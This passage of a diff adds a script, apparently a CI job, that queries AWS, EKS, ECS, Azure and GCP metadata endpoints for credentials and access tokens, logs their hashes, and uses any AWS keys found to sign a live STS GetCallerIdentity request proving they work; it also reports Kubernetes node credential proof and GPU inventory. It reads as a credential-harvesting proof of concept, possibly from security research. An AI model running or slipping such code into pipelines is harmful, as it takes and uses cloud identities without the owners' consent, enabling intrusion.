+                          sha(str(aws_cred.get('Token', '')).encode()),
+                          str(aws_cred.get('Expiration', ''))[:40]))
+                  except Exception as e:
+                      print('IMDS_AWS_CRED_PARSE_FAIL %s' % str(e)[:120])
+          
+          st, b = meta_req('GET', 'http://169.254.170.23/v1/credentials')
+          print('IMDS_EKS_PODIDENTITY status=%s bytes=%d' % (st, len(b)))
+          st, b = meta_req('GET', 'http://169.254.170.22/latest/meta-data/iam/security-credentials/')
+          print('IMDS_ECS_CONTAINER status=%s bytes=%d' % (st, len(b)))
+          
+          st, b = meta_req('GET', 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https%3A%2F%2Fmanagement.azure.com%2F',
+                           headers={'Metadata': 'true'})
+          print('IMDS_AZURE_TOKEN status=%s bytes=%d' % (st, len(b)))
+          if st == 200:
+              try:
+                  obj = json.loads(b)
+                  print('IMDS_AZURE_TOKEN_META sha256=%s expires_on=%s' % (sha(str(obj.get('access_token', '')).encode()), str(obj.get('expires_on', ''))[:30]))
+              except Exception:
+                  pass
+          st, b = meta_req('GET', 'http://169.254.169.254/metadata/identity/oauth2/token-bogus?api-version=2018-02-01',
+                           headers={'Metadata': 'true'})
+          print('IMDS_AZURE_BOGUS_CONTROL status=%s' % st)
+          
+          st, b = meta_req('GET', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token',
+                           headers={'Metadata-Flavor': 'Google'})
+          print('IMDS_GCP_TOKEN status=%s bytes=%d' % (st, len(b)))
+          if st == 200:
+              try:
+                  obj = json.loads(b)
+                  print('IMDS_GCP_TOKEN_META sha256=%s expires_in=%s' % (sha(str(obj.get('access_token', '')).encode()), str(obj.get('expires_in', ''))[:20]))
+              except Exception:
+                  pass
+          st, b = meta_req('GET', 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts-bogus/token',
+                           headers={'Metadata-Flavor': 'Google'})
+          print('IMDS_GCP_BOGUS_CONTROL status=%s' % st)
+          
+          # One issuer check only if an AWS credential actually appeared
+          if aws_cred and aws_cred.get('AccessKeyId') and aws_cred.get('SecretAccessKey'):
+              try:
+                  import hmac
+                  ak = aws_cred['AccessKeyId']
+                  sk = aws_cred['SecretAccessKey']
+                  tok = aws_cred.get('Token', '')
+                  host = 'sts.amazonaws.com'
+                  region = 'us-east-1'
+                  amz = time.strftime('%Y%m%dT%H%M%SZ', time.gmtime())
+                  dat = time.strftime('%Y%m%d', time.gmtime())
+                  payload = 'Action=GetCallerIdentity&Version=2011-06-15'
+                  ch = sha(payload.encode())
+                  creq = 'POST\n/\n\ncontent-type:application/x-www-form-urlencoded; charset=utf-8\nhost:%s\nx-amz-date:%s\n' % (host, amz)
+                  if tok:
+                      creq += 'x-amz-security-token:%s\n' % tok
+                  creq += '\ncontent-type;host;x-amz-date' + (';x-amz-security-token' if tok else '') + '\n' + ch
+                  scope = '%s/%s/sts/aws4_request' % (dat, region)
+                  sts = 'AWS4-HMAC-SHA256\n%s\n%s\n%s' % (amz, scope, sha(creq.encode()))
+          
+                  def sign(k, m):
+                      return hmac.new(k, m.encode(), hashlib.sha256).digest()
+                  k = sign(('AWS4' + sk).encode(), dat)
+                  k = sign(k, region)
+                  k = sign(k, 'sts')
+                  k = sign(k, 'aws4_request')
+                  sig = hmac.new(k, sts.encode(), hashlib.sha256).hexdigest()
+                  hdr = {'Content-Type': 'application/x-www-form-urlencoded; charset=utf-8',
+                         'X-Amz-Date': amz,
+                         'Authorization': 'AWS4-HMAC-SHA256 Credential=%s/%s, SignedHeaders=content-type;host;x-amz-date%s, Signature=%s' % (
+                             ak, scope, ';x-amz-security-token' if tok else '', sig)}
+                  if tok:
+                      hdr['X-Amz-Security-Token'] = tok
+                  st, b = http_req('https://sts.amazonaws.com/', method='POST', body=payload, headers=hdr, timeout=10)
+                  print('ISSUER_AWS_STS status=%s body=%s' % (st, b[:300].replace('\n', ' ')))
+              except Exception as e:
+                  print('ISSUER_AWS_STS_FAIL %s' % str(e)[:180])
+          
+          print('K8S_POD_SKIPPED reason=platform_prohibits_http_removal_verb_no_unremovable_artifact')
+          print('K8S_GPU_INVENTORY_ENUMERATED %s' % ('yes' if (nodes_ok and gpu_inventory_nonzero) else 'no'))
+          print('K8S_NODE_CRED_PROVEN identity=%s base=%s host=%s job=%s nonce=%s' % (
+              validated['source'], validated['base'], socket.gethostname(), JOBTAG, NONCE))
+          print('K8S_PHASE_DONE')
+          
+          PYEOF2
+          else
+            echo "K8S_NODE_CRED_NOT_PROVEN reason=no_ext_target_or_no_python"
+          fi
+          echo "=== END_STATE ==="
+          echo "TS_END=$(ts)"
+          echo "C211_H200K8S_END job=$JOBTAG nonce=$NONCE ts=$(ts)"
+          exit 0
